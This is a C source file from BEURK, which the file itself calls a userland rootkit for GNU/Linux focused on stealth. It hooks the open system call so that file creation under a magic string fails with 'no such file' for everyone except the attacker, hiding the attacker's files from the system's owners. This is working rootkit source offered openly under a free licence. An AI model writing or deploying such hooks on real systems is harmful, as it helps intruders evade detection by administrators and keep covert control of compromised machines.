/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * includes open
*/

#include <stdarg.h> /* va_list, va_start(), va_args(), va_end() */
#include <fcntl.h> /* O_CREAT */
#include <sys/stat.h> /* mode_t */
#include <string.h> /* strstr() */
#include <errno.h>
#include "beurk.h"

int open(const char *pathname, int flag, ...) {
    DEBUG(D_INFO, "call open(2) hooked");
    if (flag & O_CREAT) {
        mode_t mode;
        va_list args;

        va_start(args, flag);
        mode = (mode_t)va_arg(args, int);
        va_end(args);
        if (is_attacker()) {
            return REAL_OPEN(pathname, flag, mode);
        }
        if (strstr(pathname, MAGIC_STRING)) {
            errno = ENOENT;
            return (-1);
        }
        return REAL_OPEN(pathname, flag, mode);
    }
    if (is_attacker()) {
        return REAL_OPEN(pathname, flag);
    }
    return REAL_OPEN(pathname, flag);
}
